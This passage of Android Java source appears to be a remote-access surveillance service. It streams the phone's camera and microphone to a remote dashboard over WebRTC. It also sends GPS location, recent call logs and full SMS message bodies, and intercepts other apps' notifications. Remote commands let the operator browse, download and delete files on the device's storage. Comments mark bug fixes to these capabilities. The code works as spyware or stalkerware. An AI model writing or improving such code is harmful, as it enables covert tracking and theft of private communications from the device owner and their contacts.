            if (inVideo && line.startsWith("c="))
                sb.append("b=AS:").append(MAX_VIDEO_BITRATE_KBPS).append("\r\n");
        }
        return sb.toString()
                .replace("a=sendrecv", "a=sendonly")
                .replace("a=recvonly", "a=sendonly");
    }

    // =========================================================================
    // Offer + Signaling
    // =========================================================================

    private void createAndSendOffer() {
        if (peerConnection == null) { Log.e(TAG, "No PeerConnection"); return; }
        if (webClientId == null)    { Log.w(TAG, "No web client"); return; }
        // FIX Bug 10 — null-check socket before calling socket.id()
        final String fromId = (socket != null && socket.connected()) ? socket.id() : deviceId;
        Log.d(TAG, "Creating offer -> " + webClientId);
        MediaConstraints mc = new MediaConstraints();
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));
        peerConnection.createOffer(new SdpObserver() {
            @Override public void onCreateSuccess(SessionDescription sdp) {
                String mod = applyBitrateConstraints(sdp.description);
                SessionDescription modSdp = new SessionDescription(sdp.type, mod);
                peerConnection.setLocalDescription(new SdpObserver() {
                    @Override public void onSetSuccess() {
                        try {
                            JSONObject sig = new JSONObject(); sig.put("type", "offer"); sig.put("sdp", modSdp.description);
                            JSONObject msg = new JSONObject(); msg.put("to", webClientId); msg.put("from", fromId); msg.put("signal", sig);
                            sendSignal(msg);
                            Log.d(TAG, "Offer sent");
                        } catch (JSONException e) { Log.e(TAG, "Offer send fail", e); }
                    }
                    @Override public void onSetFailure(String e)    { Log.e(TAG, "setLocal fail: " + e); }
                    @Override public void onCreateSuccess(SessionDescription s) {}
                    @Override public void onCreateFailure(String f) {}
                }, modSdp);
            }
            @Override public void onSetSuccess()             {}
            @Override public void onCreateFailure(String e)  { Log.e(TAG, "createOffer fail: " + e); }
            @Override public void onSetFailure(String e)     { Log.e(TAG, "setDesc fail: " + e); }
        }, mc);
    }

    private void handleSignaling(JSONObject msg) {
        try {
            JSONObject signal = msg.getJSONObject("signal");
            String type = signal.optString("type", "");
            if ("answer".equals(type)) {
                if (peerConnection == null) return;
                peerConnection.setRemoteDescription(simpleSdpObserver,
                        new SessionDescription(SessionDescription.Type.ANSWER, signal.getString("sdp")));
            } else if (signal.has("candidate")) {
                if (peerConnection == null) return;
                JSONObject c = signal.getJSONObject("candidate");
                peerConnection.addIceCandidate(new IceCandidate(
                        c.getString("sdpMid"), c.getInt("sdpMLineIndex"), c.getString("candidate")));
            }
        } catch (JSONException e) { Log.e(TAG, "Signaling error", e); }
    }

    private final SdpObserver simpleSdpObserver = new SdpObserver() {
        @Override public void onCreateSuccess(SessionDescription s) {}
        @Override public void onSetSuccess()                         { Log.d(TAG, "SDP set"); }
        @Override public void onCreateFailure(String e)              { Log.e(TAG, "SDP create fail: " + e); }
        @Override public void onSetFailure(String e)                 { Log.e(TAG, "SDP set fail: " + e); }
    };

    // =========================================================================
    // Location
    // =========================================================================

    private void startLocationUpdatesIfAllowed() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
        LocationRequest req = LocationRequest.create();
        req.setInterval(10_000); req.setFastestInterval(5_000);
        req.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        locationCallback = new LocationCallback() {
            @Override public void onLocationResult(LocationResult r) {
                if (r == null) return;
                for (android.location.Location loc : r.getLocations()) sendLocation(loc.getLatitude(), loc.getLongitude());
            }
        };
        try { fusedLocationClient.requestLocationUpdates(req, locationCallback, Looper.getMainLooper()); }
        catch (SecurityException e) { Log.e(TAG, "Location fail", e); }
    }

    private void sendLocation(double lat, double lng) {
        if (webClientId == null) return;
        try {
            JSONObject d = new JSONObject();
            d.put("deviceId",  deviceId);
            d.put("latitude",  lat);
            d.put("longitude", lng);
            d.put("time",      System.currentTimeMillis());

            if (socket != null && socket.connected()) {
                // Primary path: Socket.IO
                d.put("from", socket.id());
                d.put("to",   webClientId);
                socket.emit("location", d);
            } else if (usingAgoraSignal) {
                // FIX Bug 6/10 — GPS no longer silently dropped when Agora fallback is active.
                // Wrap payload in a signaling envelope so handleAgoraMessage() can parse it
                // identically to a Socket.IO "location" event on the receiving dashboard.
                JSONObject envelope = new JSONObject();
                envelope.put("type",    "location");
                envelope.put("payload", d);
                sendViaAgora(envelope.toString());
                Log.d(TAG, "Location sent via Agora fallback");
            } else {
                Log.w(TAG, "sendLocation: no channel available — GPS dropped");
            }
        } catch (JSONException e) { Log.e(TAG, "Location send fail", e); }
    }

    private void stopLocationUpdates() {
        if (locationCallback != null && fusedLocationClient != null) {
            fusedLocationClient.removeLocationUpdates(locationCallback);
            locationCallback = null;
        }
    }

    // =========================================================================
    // Data Polling
    // =========================================================================

    private void startDataPollingIfAllowed() {
        boolean canCall = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
        boolean canSms  = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)      == PackageManager.PERMISSION_GRANTED;
        if (!canCall && !canSms) return;
        dataHandler  = new Handler(Looper.getMainLooper());
        dataRunnable = new Runnable() {
            @Override public void run() {
                if (canCall) sendCallLogs();
                if (canSms)  sendSmsMessages();
                if (dataHandler != null) dataHandler.postDelayed(this, DATA_POLL_INTERVAL);
            }
        };
        dataHandler.post(dataRunnable);
    }

    private void sendCallLogs() {
        // FIX Bug 10 — null-check socket
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            Cursor cur = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION},
                    null, null, CallLog.Calls.DATE + " DESC");
            if (cur == null) return;
            JSONArray arr = new JSONArray(); int cnt = 0;
            while (cur.moveToNext() && cnt < 10) {
                JSONObject c = new JSONObject();
                c.put("number",   cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                c.put("type",     getCallTypeString(cur.getInt(cur.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
                c.put("date",     new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(cur.getLong(cur.getColumnIndexOrThrow(CallLog.Calls.DATE)))));
                c.put("duration", cur.getLong(cur.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                arr.put(c); cnt++;
            }
            cur.close();
            JSONObject msg = new JSONObject();
            msg.put("deviceId", deviceId);
            msg.put("to",       webClientId);
            msg.put("from",     socket.id());
            msg.put("call_logs", arr);
            socket.emit("call_log", msg);
        } catch (Exception e) { Log.e(TAG, "Call logs error", e); }
    }

    private void sendSmsMessages() {
        // FIX Bug 10 — null-check socket
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            Cursor cur = getContentResolver().query(Telephony.Sms.CONTENT_URI,
                    new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE},
                    null, null, Telephony.Sms.DATE + " DESC");
            if (cur == null) return;
            JSONArray arr = new JSONArray(); int cnt = 0;
            while (cur.moveToNext() && cnt < 50) {
                JSONObject s = new JSONObject();
                s.put("address", cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                s.put("body",    cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                s.put("date",    new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(cur.getLong(cur.getColumnIndexOrThrow(Telephony.Sms.DATE)))));
                s.put("type",    getSmsTypeString(cur.getInt(cur.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
                arr.put(s); cnt++;
            }
            cur.close();
            JSONObject msg = new JSONObject();
            msg.put("deviceId",    deviceId);
            msg.put("to",          webClientId);
            msg.put("from",        socket.id());
            msg.put("sms_messages", arr);
            socket.emit("sms", msg);
        } catch (Exception e) { Log.e(TAG, "SMS error", e); }
    }

    private String getCallTypeString(int t) {
        switch (t) {
            case CallLog.Calls.INCOMING_TYPE: return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:   return "Missed";
            default:                          return "Unknown";
        }
    }
    private String getSmsTypeString(int t) {
        switch (t) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "Received";
            case Telephony.Sms.MESSAGE_TYPE_SENT:  return "Sent";
            default:                               return "Unknown";
        }
    }

    // =========================================================================
    // File System
    // =========================================================================

    private void handleFsList(JSONObject data) {
        // FIX Bug 10 — null-check socket and socket.connected() before use
        if (socket == null || !socket.connected() || webClientId == null) {
            Log.w(TAG, "handleFsList: socket null/disconnected");
            return;
        }
        String path = data.optString("path", "/storage/emulated/0/");
        File dir = new File(path);
        JSONArray arr = new JSONArray();
        if (dir.exists() && dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) for (File f : files) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("name", f.getName()); o.put("path", f.getAbsolutePath());
                    o.put("isDir", f.isDirectory()); o.put("size", f.isDirectory() ? 0 : f.length());
                    o.put("lastModified", f.lastModified()); arr.put(o);
                } catch (JSONException e) { e.printStackTrace(); }
            }
        }
        try {
            JSONObject resp = new JSONObject(); resp.put("currentPath", path); resp.put("files", arr);
            JSONObject msg  = new JSONObject(); msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("file_list", resp);
            socket.emit("fs:list_result", msg);
        } catch (JSONException e) { Log.e(TAG, "FS list error", e); }
    }

    private void handleFsDownload(JSONObject data) {
        String path = data.optString("path", "");
        if (path.isEmpty() || webClientId == null) return;
        // FIX Bug 10 — null-check
        if (socket == null || !socket.connected()) { Log.w(TAG, "handleFsDownload: socket null"); return; }
        File file = new File(path);
        if (!file.exists() || !file.isFile()) return;
        new Thread(() -> {
            try {
                String fileId      = UUID.randomUUID().toString();
                long   fileSize    = file.length();
                int    chunkSize   = 64 * 1024;
                int    totalChunks = (int) Math.ceil((double) fileSize / chunkSize);
                JSONObject start = new JSONObject();
                start.put("to", webClientId); start.put("from", socket.id());
                start.put("fileId", fileId); start.put("name", file.getName());
                start.put("size", fileSize); start.put("totalChunks", totalChunks);
                socket.emit("fs:download_start", start);
                FileInputStream fis = new FileInputStream(file);
                byte[] buf = new byte[chunkSize]; int read; int idx = 0;
                while ((read = fis.read(buf)) != -1) {
                    if (socket == null || !socket.connected()) break;
                    JSONObject chunk = new JSONObject();
                    chunk.put("to", webClientId); chunk.put("from", socket.id());
                    chunk.put("fileId", fileId); chunk.put("chunkIndex", idx);
                    chunk.put("content", Base64.encodeToString(buf, 0, read, Base64.NO_WRAP));
                    socket.emit("fs:download_chunk", chunk); idx++; Thread.sleep(50);
                }
                fis.close();
                JSONObject done = new JSONObject();
                done.put("to", webClientId); done.put("from", socket.id()); done.put("fileId", fileId);
                socket.emit("fs:download_complete", done);
            } catch (Exception e) {
                Log.e(TAG, "Download error", e);
                try {
                    if (socket != null && socket.connected()) {
                        JSONObject err = new JSONObject(); err.put("to", webClientId); err.put("error", e.getMessage()); socket.emit("fs:download_error", err);
                    }
                } catch (JSONException ignored) {}
            }
        }).start();
    }

    private void handleFsDownloadReady(JSONObject data) {
        try {
            String fileId = data.optString("fileId", "");
            if (!fileId.isEmpty()) Log.d(TAG, "Download ready ack for fileId: " + fileId);
        } catch (Exception e) { Log.e(TAG, "fs:download_ready error", e); }
    }

    private void handleFsDelete(JSONObject data) {
        // FIX Bug 10 — null-check socket before use
        if (socket == null || !socket.connected()) { Log.w(TAG, "handleFsDelete: socket null"); return; }
        String path = data.optString("path", "");
        if (path.isEmpty()) return;
        File f = new File(path);
        if (f.exists()) { if (f.isDirectory()) deleteRecursive(f); else f.delete(); }
    }

    private boolean deleteRecursive(File f) {
        if (f.isDirectory()) { File[] ch = f.listFiles(); if (ch != null) for (File c : ch) deleteRecursive(c); }
        return f.delete();
    }

    // =========================================================================
    // Notification
    // =========================================================================

    private Notification createNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Streaming Service", NotificationManager.IMPORTANCE_LOW);
            nm.createNotificationChannel(ch);
        }
        Intent stop = new Intent(this, StreamingService.class); stop.setAction("STOP_STREAMING");
        int piFlags = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
                : PendingIntent.FLAG_UPDATE_CURRENT;
        PendingIntent pi = PendingIntent.getService(this, 0, stop, piFlags);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Streaming Active")
                .setContentText("Camera and microphone streaming is running")
                .addAction(android.R.drawable.ic_media_pause, "Stop", pi)
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setOngoing(true).build();
    }

    // =========================================================================
    // Cleanup
    // =========================================================================

    private void cleanup() {
        stopLocationUpdates();
        if (torchOn) setTorch(false);
        if (captureManager != null) { captureManager.stopBackgroundThread(); captureManager = null; }
        if (frontCapturer  != null) { try { frontCapturer.stopCapture(); } catch (InterruptedException ignored) {} frontCapturer.dispose(); frontCapturer = null; }
        if (backCapturer   != null) { try { backCapturer.stopCapture();  } catch (InterruptedException ignored) {} backCapturer.dispose();  backCapturer  = null; }
        if (frontSource    != null) { frontSource.dispose();  frontSource   = null; }
        if (backSource     != null) { backSource.dispose();   backSource    = null; }
        if (audioSource    != null) { audioSource.dispose();  audioSource   = null; }
        if (peerConnection != null) { peerConnection.close(); peerConnection = null; }
        if (frontHelper    != null) { frontHelper.dispose();  frontHelper   = null; }
        if (backHelper     != null) { backHelper.dispose();   backHelper    = null; }
        if (eglBase        != null) { eglBase.release();      eglBase       = null; }
        if (factory        != null) { factory.dispose();      factory       = null; }
        if (dataHandler    != null && dataRunnable != null) { dataHandler.removeCallbacks(dataRunnable); dataHandler = null; dataRunnable = null; }
        mainHandler.removeCallbacksAndMessages(null);
    }

    // =========================================================================
    // FIX Bug 7 — NotificationListener: Share parent service socket instead of
    // creating its own isolated socket. Uses static callback so parent service
    // handles all socket emission.
    // =========================================================================

    static volatile NotificationEmitCallback sNotificationCallback = null;

    interface NotificationEmitCallback {
        void onNotification(JSONObject payload);
    }

    public static class NotificationListener extends NotificationListenerService {

        private static final String TAG2 = "NotifListener";

        @Override
        public void onCreate() {
            super.onCreate();
            Log.d(TAG2, "NotificationListener created");
        }

        private void sendActiveNotifications() {
            try {
                StatusBarNotification[] active = getActiveNotifications();
                if (active != null) for (StatusBarNotification s : active) onNotificationPosted(s);
            } catch (Exception e) { Log.e(TAG2, "Active notifications error", e); }
        }

        @Override
        public void onNotificationPosted(StatusBarNotification sbn) {
            NotificationEmitCallback cb = StreamingService.sNotificationCallback;
            if (cb == null) return;
            try {
                Notification n = sbn.getNotification();
                JSONObject d = new JSONObject();
                d.put("appName",   sbn.getPackageName());
                d.put("title",     n.extras.getString(Notification.EXTRA_TITLE, "No Title"));
                d.put("text",      n.extras.getString(Notification.EXTRA_TEXT,  "No Text"));
                d.put("timestamp", new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(sbn.getPostTime())));
                cb.onNotification(d);
            } catch (JSONException e) { Log.e(TAG2, "Notification build error", e); }
        }

        @Override
        public void onDestroy() {
            super.onDestroy();
            Log.d(TAG2, "NotificationListener destroyed");
        }
    }
}
